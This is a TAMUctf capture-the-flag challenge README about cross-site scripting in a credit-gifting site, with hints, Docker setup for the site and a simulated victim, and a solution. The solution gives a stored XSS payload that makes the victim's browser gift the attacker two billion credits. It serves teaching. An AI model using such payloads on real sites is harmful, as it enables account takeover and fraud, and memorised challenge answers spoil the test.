# XSS unfiltered
The objective of this challenge is to make the user understand how cross site scripting works.

# DISCLAIMER

This challenge was removed from TAMUctf mid-competition.

## Challenge flavor
Try testing out this new credit system that I just created! We already have our first user, bob!

		http://<address>

hint: Credit generation is rate limited. It is literally impossible to generate 2,000,000,000 credits within the CTF timeframe.

hint2: Bob seems to have somehow gotten the 2,000,000,000 credits... He seems pretty active.

## Setup
Build and run docker container for website

        sudo docker build -t more_credits .

		sudo docker run more_credits

Then build and run docker container for bob. Make sure to change the value on line 14 for bob_script.py to the actual address of the hosted webpage

        sudo docker build -t bob .

		sudo docker run bob

## Solution
The gifting system allows the user to send credits with a message tagline attached. The message system is vulnerable to XSS. Send the following payload to the user "bob" in a gift.

        <script> var xhr = new XMLHttpRequest(); xhr.open("POST","/gift",true); xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); xhr.send('username=sho&credits=2000000000&message=yourewelcome;)'); </script>
